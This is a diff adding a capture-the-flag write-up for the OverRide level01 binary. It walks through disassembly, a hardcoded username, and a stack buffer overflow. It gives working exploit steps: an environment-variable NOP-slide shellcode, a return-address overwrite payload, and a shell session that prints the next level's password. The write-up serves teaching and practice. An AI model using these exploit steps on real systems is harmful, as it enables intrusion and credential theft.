@@ -1,0 +1,122 @@
+This program bzero's a 64 bytes buffer on the stack
+80484d8:	83 ec 60             	sub    esp,0x60
+ 80484db:	8d 5c 24 1c          	lea    ebx,[esp+0x1c]
+ 80484df:	b8 00 00 00 00       	mov    eax,0x0
+ 80484e4:	ba 10 00 00 00       	mov    edx,0x10
+ 80484e9:	89 df                	mov    edi,ebx
+ 80484eb:	89 d1                	mov    ecx,edx
+ 80484ed:	f3 ab                	rep stos DWORD PTR es:[edi],eax
+Then it fgets from stdin a max of 255 chars (+ '\0') from stdin into a .bss buffer
+And calls the verify_user_name() function whichs checks the buffer against the "dat_wil" string:
+08048464 <verify_user_name>:
+ 8048464:	55                   	push   ebp
+ 8048465:	89 e5                	mov    ebp,esp
+ 8048467:	57                   	push   edi
+ 8048468:	56                   	push   esi
+ 8048469:	83 ec 10             	sub    esp,0x10
+ 804846c:	c7 04 24 90 86 04 08 	mov    DWORD PTR [esp],0x8048690
+ 8048473:	e8 08 ff ff ff       	call   8048380 <puts@plt>
+ 8048478:	ba 40 a0 04 08       	mov    edx,0x804a040
+ 804847d:	b8 a8 86 04 08       	mov    eax,0x80486a8
+ 8048482:	b9 07 00 00 00       	mov    ecx,0x7
+ 8048487:	89 d6                	mov    esi,edx
+ 8048489:	89 c7                	mov    edi,eax
+ 804848b:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+ 804848d:	0f 97 c2             	seta   dl
+ 8048490:	0f 92 c0             	setb   al
+ 8048493:	89 d1                	mov    ecx,edx
+ 8048495:	28 c1                	sub    cl,al
+ 8048497:	89 c8                	mov    eax,ecx
+ 8048499:	0f be c0             	movsx  eax,al
+ 804849c:	83 c4 10             	add    esp,0x10
+ 804849f:	5e                   	pop    esi
+ 80484a0:	5f                   	pop    edi
+ 80484a1:	5d                   	pop    ebp
+ 80484a2:	c3                   	ret    
+The return is non-zero if the strings (of at max 7 bytes) are different
+
+If the input'ed string is "dat_wil" (verify_user_name() === 0) then we get to go one step futher, the program fgets once again, this time into the 64 bytes stack buffer previously bzero'd:
+ 804856d:	8d 44 24 1c          	lea    eax,[esp+0x1c]
+ 8048571:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8048574:	e8 f7 fd ff ff       	call   8048370 <fgets@plt>
+
+And then calls the verify_user_pass() function with that buffer address as an argument:
+ 804857d:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8048580:	e8 1e ff ff ff       	call   80484a3 <verify_user_pass>
+ 
+That function checks
+080484a3 <verify_user_pass>:
+ 80484a3:	55                   	push   ebp
+ 80484a4:	89 e5                	mov    ebp,esp
+ 80484a6:	57                   	push   edi
+ 80484a7:	56                   	push   esi
+ 80484a8:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
+ 80484ab:	89 c2                	mov    edx,eax
+ 80484ad:	b8 b0 86 04 08       	mov    eax,0x80486b0
+ 80484b2:	b9 05 00 00 00       	mov    ecx,0x5
+ 80484b7:	89 d6                	mov    esi,edx
+ 80484b9:	89 c7                	mov    edi,eax
+ 80484bb:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+ 80484bd:	0f 97 c2             	seta   dl
+ 80484c0:	0f 92 c0             	setb   al
+ 80484c3:	89 d1                	mov    ecx,edx
+ 80484c5:	28 c1                	sub    cl,al
+ 80484c7:	89 c8                	mov    eax,ecx
+ 80484c9:	0f be c0             	movsx  eax,al
+ 80484cc:	5e                   	pop    esi
+ 80484cd:	5f                   	pop    edi
+ 80484ce:	5d                   	pop    ebp
+ 80484cf:	c3                   	ret    
+
+Then weither or not the password is correct, the program ends up quitting.
+
+However, the last fgets has a max size of 0x65 = 100 bytes were the size of the stack buffer is 64, we can therefore buffer overflow onto the return EIP, by providing a large password to fgets, and hijack the program by rop'ing into a shellcode stored in the environment.
+
+Since there is 0x60 = 96 bytes allocated on the stack (assuming stack is already 16-bytes aligned) and the stack buffer is located 1c = 28 bytes above the top of the stack, there is 96 - 28 = 68 bytes to overwrite before the saved registers.
+The saved registers are edi ebo and ebp, which amounts to 4 * 3 = 12 bytes
+Therefor, we've got 68 + 12 = 80 bytes to fill before overwriting the return EIP.
+
+We will include a NOP-slide into our shellcode such that we don't have to be too accurate with the overwritten address.
+[Build shellcode]
+$ nasm ./Ressources/shellcode.asm 
+
+[Upload shellcode]
+scp -P 4242 ./Ressources/shellcode level01@OVERRIDE_IP:/tmp/shellcode
+We can store our shellcode like this:
+export SHELLCODE="`python -c 'import sys; sys.stdout.write("\x90" * 100000);'`""`cat /tmp/shellcode`"
+
+We can get a good idea of the location in memory of the SHELLCODE env variable by launching gdb and using it to call getenv("SHELLCODE"):
+level01@OverRide:~$ gdb  ./level01
+[Truncated for clarity]
+(gdb) b main
+Breakpoint 1 at 0x80484d5
+(gdb) start
+Temporary breakpoint 2 at 0x80484d5
+Starting program: /home/users/level01/level01 
+
+Breakpoint 1, 0x080484d5 in main ()
+(gdb) print/x getenv("SHELLCODE")
+$1 = 0xffffb1b9
+(gdb) 
+
+We can then use this script to generate the input file to our program:
+echo dat_wil
+python -c 'import sys; sys.stdout.write("\xAA\xAA\xAA\xAA" * 20 + "\xb9\xb1\xff\xff" +"\xBB\xBB\xBB\xBB" + "\n")'
+
+[Build input file]
+$ ./Ressources/script > input
+[Upload input file]
+scp -P 4242 input level01@OVERRIDE_IP:/tmp/input
+
+And then:
+level01@OverRide:~$ cat /tmp/input - |   ./level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+whoami
+level02
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
